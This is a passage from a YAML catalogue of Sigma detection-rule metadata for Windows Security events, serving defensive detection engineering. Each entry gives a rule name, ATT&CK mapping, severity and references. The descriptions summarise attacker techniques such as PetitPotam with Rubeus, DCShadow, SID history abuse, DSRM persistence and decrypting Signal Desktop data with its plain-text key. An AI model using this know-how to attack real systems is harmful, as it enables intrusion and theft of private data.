  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d3abac66-f11c-4ed0-8acb-50cc29c97eed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_net_ntlm_downgrade.yml
  name: NetNTLM Downgrade Attack
  description: Detects NetNTLM downgrade attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1562.001
  - attack.t1112
  time_window: ''
  references:
  - https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks
  false_positives:
  - Unknown
  notes: ''
- detection_id: 35bc7e28-ee6b-492f-ab04-da58fcf6402e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_net_share_obj_susp_desktop_ini.yml
  name: Windows Network Access Suspicious desktop.ini Action
  description: Detects unusual processes accessing desktop.ini remotely over network
    share, which can be leveraged to alter how Explorer displays a folder's content
    (i.e. renaming files) without changing them on disk.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.009
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.009
  time_window: ''
  references:
  - https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/
  false_positives:
  - Read only access list authority
  notes: ''
- detection_id: cfeed607-6aa4-4bbd-9627-b637deb723c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_new_or_renamed_user_account_with_dollar_sign.yml
  name: New or Renamed User Account with '$' Character
  description: 'Detects the creation of a user with the "$" character. This can be
    used by attackers to hide a user or trick detection systems that lack the parsing
    mechanisms.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1387743867663958021
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8e5c03fa-b7f0-11ea-b242-07e0576828d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_not_allowed_rdp_access.yml
  name: Denied Access To Remote Desktop
  description: 'This event is generated when an authenticated user who is not allowed
    to log on remotely attempts to connect to this computer through Remote Desktop.

    Often, this event can be generated by attackers when searching for available windows
    servers in the network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  tags:
  - attack.lateral-movement
  - attack.t1021.001
  time_window: ''
  references:
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4825
  false_positives:
  - Valid user was not added to RDP group
  notes: ''
- detection_id: 12ba6a38-adb3-4d6b-91ba-a7fb248e3199
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_password_policy_enumerated.yml
  name: Password Policy Enumerated
  description: Detects when the password policy is enumerated.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1201
  tags:
  - attack.discovery
  - attack.t1201
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4661
  - https://github.com/jpalanco/alienvault-ossim/blob/f74359c0c027e42560924b5cff25cdf121e5505a/os-sim/agent/src/ParserUtil.py#L951
  false_positives: []
  notes: ''
- detection_id: 7b687634-ab20-11ea-bb37-0242ac130002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_pcap_drivers.yml
  name: Windows Pcap Drivers
  description: Detects Windows Pcap driver installation based on a list of associated
    .sys files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1040
  time_window: ''
  references:
  - https://ragged-lab.blogspot.com/2020/06/capturing-pcap-driver-installations.html#more
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ce8c8a3-2723-48ed-8246-906ac91061a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_petitpotam_network_share.yml
  name: Possible PetitPotam Coerce Authentication Attempt
  description: Detect PetitPotam coerced authentication activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1187
  tags:
  - attack.credential-access
  - attack.t1187
  time_window: ''
  references:
  - https://github.com/topotam/PetitPotam
  - https://github.com/splunk/security_content/blob/0dd6de32de2118b2818550df9e65255f4109a56d/detections/endpoint/petitpotam_network_share_access_request.yml
  false_positives:
  - Unknown. Feedback welcomed.
  notes: ''
- detection_id: 6a53d871-682d-40b6-83e0-b7c1a6c4e3a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_petitpotam_susp_tgt_request.yml
  name: PetitPotam Suspicious Kerberos TGT Request
  description: 'Detect suspicious Kerberos TGT requests.

    Once an attacer obtains a computer certificate by abusing Active Directory Certificate
    Services in combination with PetitPotam, the next step would be to leverage the
    certificate for malicious purposes.

    One way of doing this is to request a Kerberos Ticket Granting Ticket using a
    tool like Rubeus.

    This request will generate a 4768 event with some unusual fields depending on
    the environment.

    This analytic will require tuning, we recommend filtering Account_Name to the
    Domain Controller computer accounts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1187
  tags:
  - attack.credential-access
  - attack.t1187
  time_window: ''
  references:
  - https://github.com/topotam/PetitPotam
  - https://isc.sans.edu/forums/diary/Active+Directory+Certificate+Services+ADCS+PKI+domain+admin+vulnerability/27668/
  - https://github.com/splunk/security_content/blob/88d689fe8a055d8284337b9fad5d9152b42043db/detections/endpoint/petitpotam_suspicious_kerberos_tgt_request.yml
  false_positives:
  - False positives are possible if the environment is using certificates for authentication.
    We recommend filtering Account_Name to the Domain Controller computer accounts.
  notes: ''
- detection_id: 32e19d25-4aed-4860-a55a-be99cb0bf7ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_possible_dc_shadow.yml
  name: Possible DC Shadow Attack
  description: Detects DCShadow via create new SPN
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1207
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1207
  time_window: ''
  references:
  - https://twitter.com/gentilkiwi/status/1003236624925413376
  - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2
  - https://web.archive.org/web/20180203014709/https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?gi=c426ac876c48
  false_positives:
  - Valid on domain controllers; exclude known DCs
  notes: ''
- detection_id: 2a926e6a-4b81-4011-8a96-e36cc8c04302
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_powershell_script_installed_as_service.yml
  name: PowerShell Scripts Installed as Services - Security
  description: Detects powershell script installed as a Service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: 45545954-4016-43c6-855e-eae8f1c369dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_protected_storage_service_access.yml
  name: Protected Storage Service Access
  description: Detects access to a protected_storage service over the network. Potential
    abuse of DPAPI to extract domain backup keys from Domain Controllers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190620-DomainDPAPIBackupKeyExtraction/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5bed80b6-b3e8-428e-a3ae-d3c757589e41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_rdp_reverse_tunnel.yml
  name: RDP over Reverse SSH Tunnel WFP
  description: Detects svchost hosting RDP termsvcs communicating with the loopback
    address
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  - T1090.001
  - T1090.002
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.lateral-movement
  - attack.t1090.001
  - attack.t1090.002
  - attack.t1021.001
  - car.2013-07-002
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1096148422984384514
  - https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/44fbe85f72ee91582876b49678f9a26292a155fb/Command%20and%20Control/DE_RDP_Tunnel_5156.evtx
  false_positives:
  - Programs that connect locally to the RDP port
  notes: ''
- detection_id: 12e6d621-194f-4f59-90cc-1959e21e69f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_register_new_logon_process_by_rubeus.yml
  name: Register new Logon Process by Rubeus
  description: Detects potential use of Rubeus via registered new trusted logon process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.lateral-movement
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 11d00fff-5dc3-428c-8184-801f292faec0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_registry_permissions_weakness_check.yml
  name: Service Registry Key Read Access Request
  description: 'Detects "read access" requests on the services registry key.

    Adversaries may execute their own malicious payloads by hijacking the Registry
    entries used by services.

    Adversaries may use flaws in the permissions for Registry keys related to services
    to redirect from the originally specified executable to one that they control,
    in order to launch their own code when a service starts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/service_registry_permissions_weakness_check/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.011/T1574.011.md#atomic-test-1---service-registry-permissions-weakness
  false_positives:
  - Likely from legitimate applications reading their key. Requires heavy tuning
  notes: ''
- detection_id: 13acf386-b8c6-4fe0-9a6e-c4756b974698
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_remote_powershell_session.yml
  name: Remote PowerShell Sessions Network Connections (WinRM)
  description: Detects basic PowerShell Remoting (WinRM) by monitoring for network
    inbound connections to ports 5985 OR 5986
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html
  false_positives:
  - Legitimate use of remote PowerShell execution
  notes: ''
- detection_id: 5a44727c-3b85-4713-8c44-4401d5499629
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_replay_attack_detected.yml
  name: Replay Attack Detected
  description: Detects possible Kerberos Replay Attack on the domain controllers when
    "KRB_AP_ERR_REPEAT" Kerberos response is sent to the client
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558
  tags:
  - attack.credential-access
  - attack.t1558
  time_window: ''
  references:
  - https://github.com/Yamato-Security/EnableWindowsLogSettings/blob/7f6d755d45ac7cc9fc35b0cbf498e6aa4ef19def/ConfiguringSecurityLogAuditPolicies.md
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4649
  false_positives:
  - Unknown
  notes: ''
- detection_id: f8748f2c-89dc-4d95-afb0-5a2dfdbad332
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_sam_registry_hive_handle_request.yml
  name: SAM Registry Hive Handle Request
  description: Detects handles requested to SAM registry hive
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1012
  - T1552.002
  tags:
  - attack.discovery
  - attack.t1012
  - attack.credential-access
  - attack.t1552.002
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190725-SAMRegistryHiveHandleRequest/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 13addce7-47b2-4ca0-a98f-1de964d1d669
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_scm_database_handle_failure.yml
  name: SCM Database Handle Failure
  description: Detects non-system users failing to get a handle of the SCM database.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1010
  tags:
  - attack.discovery
  - attack.t1010
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190826-RemoteSCMHandle/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: dae8171c-5ec6-4396-b210-8466585b53e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_scm_database_privileged_operation.yml
  name: SCM Database Privileged Operation
  description: Detects non-system users performing privileged operation os the SCM
    database
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190826-RemoteSCMHandle/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39a80702-d7ca-4a83-b776-525b1f86a36d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_sdelete_potential_secure_deletion.yml
  name: Potential Secure Deletion with SDelete
  description: Detects files that have extensions commonly seen while SDelete is used
    to wipe files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1027.005
  - T1070.004
  - T1485
  - T1553.002
  tags:
  - attack.impact
  - attack.defense-evasion
  - attack.t1070.004
  - attack.t1027.005
  - attack.t1485
  - attack.t1553.002
  - attack.s0195
  time_window: ''
  references:
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/sdelete.htm
  - https://www.jpcert.or.jp/english/pub/sr/ir_research.html
  - https://learn.microsoft.com/en-gb/sysinternals/downloads/sdelete
  false_positives:
  - Legitimate usage of SDelete
  - Files that are interacted with that have these extensions legitimately
  notes: ''
- detection_id: c8b00925-926c-47e3-beea-298fd563728e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_service_install_remote_access_software.yml
  name: Remote Access Tool Services Have Been Installed - Security
  description: Detects service installation of different remote access tools software.
    These software are often abused by threat actors to perform
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1543.003
  - T1569.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - The rule doesn't look for anything suspicious so false positives are expected.
    If you use one of the tools mentioned, comment it out
  notes: ''
- detection_id: c4e92a97-a9ff-4392-9d2d-7a4c642768ca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_service_installation_by_unusal_client.yml
  name: Service Installed By Unusual Client - Security
  description: Detects a service installed by a client which has PID 0 or whose parent
    has PID 0
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/windows-service-installed-via-an-unusual-client.html
  - https://www.x86matthew.com/view_post?id=create_svc_rpc
  - https://twitter.com/SBousseaden/status/1490608838701166596
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5d6c375a-18ae-4952-b4f6-8b803f6c8555
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_signal_sensitive_config_access.yml
  name: File Access Of Signal Desktop Sensitive Data
  description: 'Detects access to Signal Desktop''s sensitive data files: db.sqlite
    and config.json.

    The db.sqlite file in Signal Desktop stores all locally saved messages in an encrypted
    SQLite database, while the config.json contains the decryption key needed to access
    that data.

    Since the key is stored in plain text, a threat actor who gains access to both
    files can decrypt and read sensitive messages without needing the users credentials.

    Currently the rule only covers the default Signal installation path in AppData\Roaming.
    Signal Portable installations may use different paths based on user configuration.
    Additional paths can be added to the selection as needed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger/
  - https://vmois.dev/query-signal-desktop-messages-sqlite/
  false_positives:
  - Unlikely, but possible from AV or backup software accessing the files.
  notes: ''
- detection_id: b210394c-ba12-4f89-9117-44a2464b9511
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_smb_file_creation_admin_shares.yml
  name: SMB Create Remote File Admin Share
  description: Look for non-system accounts SMB accessing a file with write (0x2)
    access mask via administrative share (i.e C$).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/f7a58156dbfc9b019f17f638b8c62d22e557d350/playbooks/WIN-201012004336.yaml
  - https://securitydatasets.com/notebooks/atomic/windows/lateral_movement/SDWIN-200806015757.html?highlight=create%20file
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0255a820-e564-4e40-af2b-6ac61160335c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_add_domain_trust.yml
  name: A New Trust Was Created To A Domain
  description: Addition of domains is seldom and should be verified for legitimacy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4706
  false_positives:
  - Legitimate extension of domain structure
  notes: ''
- detection_id: 2632954e-db1c-49cb-9936-67d1ef1d17d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_add_sid_history.yml
  name: Addition of SID History to Active Directory Object
  description: An attacker can use the SID history attribute to gain additional privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1134.005
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1134.005
  time_window: ''
  references:
  - https://adsecurity.org/?p=1772
  false_positives:
  - Migration of an account into a new domain
  notes: ''
- detection_id: 39698b3f-da92-4bc6-bfb5-645a98386e45
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_computer_name.yml
  name: Win Susp Computer Name Containing Samtheadmin
  description: Detects suspicious computer name samtheadmin-{1..100}$ generated by
    hacktool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - cve.2021-42278
  - cve.2021-42287
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1511760068743766026
  - https://github.com/helloexp/0day/blob/614227a7b9beb0e91e7e2c6a5e532e6f7a8e883c/00-CVE_EXP/CVE-2021-42287/sam-the-admin/sam_the_admin.py
  false_positives:
  - Unknown
  notes: ''
- detection_id: 53ad8e36-f573-46bf-97e4-15ba5bf4bb51
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_dsrm_password_change.yml
  name: Password Change on Directory Service Restore Mode (DSRM) Account
  description: 'Detects potential attempts made to set the Directory Services Restore
    Mode administrator password.

    The Directory Service Restore Mode (DSRM) account is a local administrator account
    on Domain Controllers.

    Attackers may change the password in order to obtain persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://adsecurity.org/?p=1714
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4794
  false_positives:
  - Initial installation of a domain controller.
  notes: ''
- detection_id: 9eb99343-d336-4020-a3cd-67f3819e68ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_failed_logon_reasons.yml
  name: Account Tampering - Suspicious Failed Logon Reasons
  description: This method uses uncommon error codes on failed logons to determine
    suspicious activity and tampering with accounts that have been disabled or somehow
    restricted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625
  - https://twitter.com/SBousseaden/status/1101431884540710913
  false_positives:
  - User using a disabled account
  notes: ''
- detection_id: 1c480e10-7ee1-46d4-8ed2-85f9789e3ce4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_group_policy_abuse_privilege_addition.yml
  name: Group Policy Abuse for Privilege Addition
  description: 'Detects the first occurrence of a modification to Group Policy Object
    Attributes to add privileges to user accounts or use them to add users as local
    admins.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1484.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.001
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/group-policy-abuse-for-privilege-addition.html#_setup_275
  false_positives:
  - Users allowed to perform these modifications (user found in field SubjectUserName)
  notes: ''
- detection_id: 123e4e6d-b123-48f8-b261-7214938acaf0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_group_policy_startup_script_added_to_gpo.yml
  name: Startup/Logon Script Added to Group Policy Object
  description: 'Detects the modification of Group Policy Objects (GPO) to add a startup/logon
    script to users or computer objects.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1484.001
  - T1547
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.001
  - attack.t1547
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/startup-logon-script-added-to-group-policy-object.html
  false_positives:
  - Legitimate execution by system administrators.
  notes: ''
- detection_id: f7644214-0eb0-4ace-9455-331ec4c09253
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_kerberos_manipulation.yml
  name: Kerberos Manipulation
  description: Detects failed Kerberos TGT issue operation. This can be a sign of
    manipulations of TGT messages by an attacker.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1212
  tags:
  - attack.credential-access
  - attack.t1212
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771
  false_positives:
  - Faulty legacy applications
  notes: ''
- detection_id: d00a9a72-2c09-4459-ad03-5e0a23351e36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_ldap_dataexchange.yml
  name: Suspicious LDAP-Attributes Used
